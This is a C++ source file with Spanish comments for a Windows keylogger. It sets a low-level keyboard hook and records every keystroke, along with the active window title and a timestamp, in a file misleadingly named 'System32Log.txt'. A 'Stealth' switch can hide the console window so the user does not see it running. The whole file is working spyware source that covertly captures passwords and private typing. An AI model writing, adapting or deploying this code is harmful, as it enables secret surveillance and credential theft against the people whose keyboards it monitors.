#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>

// define si la ventana es visible o no
#define visible // (visible / invisible)

// variable para almacenar el HANDLE.  No lo declares en ningún otro lado
HHOOK _hook;

// Esta estructura contiene los datos recibidos por la devolución de llamada hook. Como ves en la función de devolución de llamada
// contiene lo que necesitará: vkCode = código de clave virtual.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, char *file);

extern char lastwindow[256];


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
	// la acción es válida: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			//Param es el puntero a la estructura que contiene los datos necesarios.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			
			// Guardar en archivo
			Save(kbdStruct.vkCode, "System32Log.txt");
		}
	}

	// llama al siguiente, Esto es necesario o la cadena  se romperá y el gancho se detendrá
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
// configurarlo para utilizar la función de devolución de llamada anterior
// WH_KEYBOARD_LL significa que establecerá un teclado de bajo nivel. Más información al respecto en MSDN.


	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Error al instalar !", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, char *file)
{
    char lastwindow[256];
    
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignora los clics del mouse
	
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
		
	
	HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);
        
        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);
            
           // consigue tiempo
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);
            
            fprintf(OUTPUT_FILE, "\n\n[Windows: %s - at %s] ", window_title, s);
        }
    }


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 189 || key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
			}
		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
													// comprobar el bloqueo de mayúsculas
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// ver la tecla shift
			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		fprintf(OUTPUT_FILE, "%c", key_stroke);
    }
// NOTA: las teclas numéricas se imprimimen en minúsculas

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
	#endif // visible

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	#endif // invisible
}

int main()
{
// visibilidad de la ventana
	Stealth();

	// Set the hook
	SetHook();

// loop para mantener en funcionamiento de la aplicación en la consola.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}